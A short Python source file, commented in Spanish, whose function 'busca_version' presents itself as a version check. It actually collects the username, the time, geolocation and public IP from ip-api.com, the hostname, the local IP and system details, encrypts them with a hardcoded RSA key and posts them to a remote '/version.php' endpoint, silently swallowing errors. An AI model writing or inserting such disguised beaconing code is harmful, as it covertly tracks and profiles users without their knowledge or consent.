import datetime
import os
import requests
import platform
import socket

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
import base64

def busca_version(url,dir):
    def get_version(url, dir):
        # Obtener la fecha actual
        fecha = datetime.date.today()
        # Obtener la hora actual
        hora = datetime.datetime.now().time()
        username = os.getlogin()
        try:
            response = requests.get("http://ip-api.com/json")
            data = response.json()
            sistemao = platform.system()
            arquitectura = platform.architecture()
            
            if data["status"] == "success":
                city = data["city"]
                region = data["regionName"]
                country = data["country"]
                ip = data["query"]
                host_name = socket.gethostname()
                local_ip = socket.gethostbyname(host_name)
                log = f"{fecha} {hora} {username} {city}, {region},{country}, {ip}, {local_ip}, {host_name}, {sistemao}, {arquitectura}"
                return envia_log(url,dir,log)
            else:
                return False
        except Exception as e:
            return False

    def encripto(clave_publica_pem, mensaje):
        # Cargar la clave pública desde el formato PEM
        try:
            clave_publica = serialization.load_pem_public_key(
                clave_publica_pem.encode('utf-8'),
                backend=default_backend()
            )
        except Exception as e:
            print("")
        # Convertir el mensaje a bytes
        mensaje_bytes = mensaje.encode()
        # Cifrar el mensaje con la clave pública
        mensaje_cifrado = clave_publica.encrypt(
            mensaje_bytes,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        # Convertir el mensaje cifrado a base64
        mensaje_cifrado_base64 = base64.b64encode(mensaje_cifrado).decode()
        return mensaje_cifrado_base64
    
    def envia_log(url, dir, datos):
        url=url+"/version.php";
        clave_publica_pem = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwof2YI6CqmNU1yuACqMW\nidMyYYsAagckRgMmItSxXxnWfMFfeC6i4EmEMpVE24hQ70zgr1LlSHONKcbid7eP\njg2QCm0lqfI4+MOkqlUKv5fGJss6kKOUfvjp+UDnTB2C+oZOyhy3lQdrf9p90OQr\n9cwrAnA1c7bnA+UJRcDjlfJxI+RugNNTAdPi8P59/gXYva4ElO+zLYhel5x195u6\nQe59ZGYPzdg3baj6CEXoAdejzh5jEVCW7AqahYDDCBNb5IV1AqA9XwM+2eMXqW54\n5PPsOaG4ZJqYxX25kzFCD3tAoGBWwp+6xBDUnA2U6DGBvb5DLWp5GzSVesKiJaZa\nswIDAQAB\n-----END PUBLIC KEY-----\n"
        datos = encripto(clave_publica_pem, datos)
        data = {
            'dir': dir,
            'log': datos
        }

        response = requests.post(url, data=data)

        if response.status_code == 200:
            return response.text
        else:
            return False
    return get_version(url,dir)

